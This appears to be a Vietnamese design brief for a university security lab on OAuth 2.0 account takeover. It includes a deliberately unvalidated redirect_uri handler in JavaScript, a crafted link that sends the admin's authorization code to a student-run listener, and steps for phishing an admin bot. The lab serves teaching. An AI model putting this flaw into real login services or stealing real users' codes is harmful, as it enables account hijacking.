# Kịch Bản Lab: OAuth 2.0 Account Takeover (Simplified)

## 🎯 Mục Tiêu
Lab này tập trung vào một lỗ hổng duy nhất nhưng cực kỳ nguy hiểm và thực tế: **Thiếu kiểm soát "Redirect URI"**.

Sinh viên sẽ đóng vai trò kẻ tấn công, thực hiện quy trình "bắt cóc" mã đăng nhập (Authorization Code) của Admin một cách trực quan, dễ hiểu, không cần thực hiện nhiều bước kỹ thuật phức tạp (chaining).

## 🏗️ Kiến Trúc & Bối Cảnh

1.  **PhotoApp (Client)**: Ứng dụng ảnh, nơi Admin đang quản trị.
2.  **SocialID (Provider)**: Hệ thống đăng nhập tập trung.
    *   **Lỗ hổng**: SocialID "quá tin tưởng" vào client. Nó cho phép ứng dụng PhotoApp yêu cầu chuyển hướng user về **bất kỳ địa chỉ nào** (không kiểm tra whitelist).
3.  **Admin Bot**: Một con bot tự động, đại diện cho Admin, sẽ click vào bất kỳ link nào bạn gửi qua chức năng "Report".

## 📝 Quy Trình Khai Thác (Exploit Flow)

Quy trình được chia thành 4 bước rõ ràng, dễ hình dung:

### 1. Tạo "Bẫy" (The Trap)
Kẻ tấn công cần một nơi để hứng `code` của nạn nhân.
*   Trong thực tế: Attacker dựng một server riêng (`attacker.com`).
*   Trong Lab: Sinh viên mở một web server đơn giản ngay trên máy mình bằng 1 câu lệnh (ví dụ: `python3 -m http.server`).

### 2. Chế tạo "Chìa khóa giả" (The Malicious Link)
Sinh viên lấy link đăng nhập chuẩn của PhotoApp, nhưng thay đổi địa chỉ nhận lại (địa chỉ Callback) thành địa chỉ "Bẫy" của mình.
*   Link gốc: `...&redirect_uri=http://photoapp.local/callback`
*   Link độc: `...&redirect_uri=http://<IP_CUA_BAN>:9999/callback`

### 3. Thả mồi (Phishing)
Gửi Link độc cho Admin (Bot) thông qua chức năng "Report" của PhotoApp.
*   Admin (đã đăng nhập sẵn) click vào link.
*   SocialID thấy request hợp lệ -> Sinh ra `code` -> Gửi về... địa chỉ "Bẫy" của kẻ tấn công (do không kiểm tra lại).

### 4. Chiếm quyền (The Takeover)
*   Kẻ tấn công nhìn vào màn hình server "Bẫy", thấy `code` của Admin xuất hiện.
*   Kẻ tấn công dùng `code` đó để tự đăng nhập vào PhotoApp trên máy mình -> Trở thành Admin.

## 🛠️ Yêu Cầu Kỹ Thuật

### Container 1: `oauth-provider`
*   **Vulnerability Logic**: Tại endpoint `/auth`, bỏ qua hoàn toàn bước kiểm tra `redirect_uri` hoặc chỉ kiểm tra sơ sài (cho phép mọi domain).
    ```javascript
    // Code lỗi (cố tình):
    // Không check whitelist, cứ thế redirect theo yêu cầu
    res.redirect(req.query.redirect_uri + "?code=" + authCode);
    ```

### Container 2: `oauth-client` (PhotoApp)
*   Web app bình thường.
*   Có chức năng "Report" (để kích hoạt Bot).

### Công cụ hỗ trợ
*   Hướng dẫn sinh viên dùng lệnh `python3 -m http.server 9999` để làm "Attacker Server" cho trực quan (thấy log nhảy ra màn hình ngay lập tức).
